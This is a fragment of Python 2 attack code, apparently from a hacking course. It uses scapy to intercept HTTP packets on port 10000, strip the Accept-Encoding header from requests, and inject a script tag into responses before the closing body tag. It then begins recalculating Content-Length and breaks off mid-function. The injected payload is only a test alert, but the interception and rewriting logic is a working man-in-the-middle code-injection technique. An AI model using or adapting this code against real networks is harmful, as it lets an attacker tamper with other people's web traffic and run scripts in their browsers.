...
def process_packet(packet):
    ...
    if sp.haslayer(scapy.Raw):
        if sp[scapy.TCP].dport == 10000:
            print "{+} HTTP Request > "
            mod_load = re.sub("Accept-Encoding:.*?\\r\\n", "", sp[scapy.Raw].load)
            np = set_load(sp,mod_load)
            packet.set_payload(str(np))
            #print sp.show()
        elif sp[scapy.TCP].sport == 10000:
            print "{+} HTTP Reponse > "
            injection_code = "<script>alert('Test');</script>"
            mod_load = sp[scapy.Raw].load.replace("</body>",injection_code + "</body>")
            csl = re.search("(?:Content-Length:\s)(\d*)",mod_load)
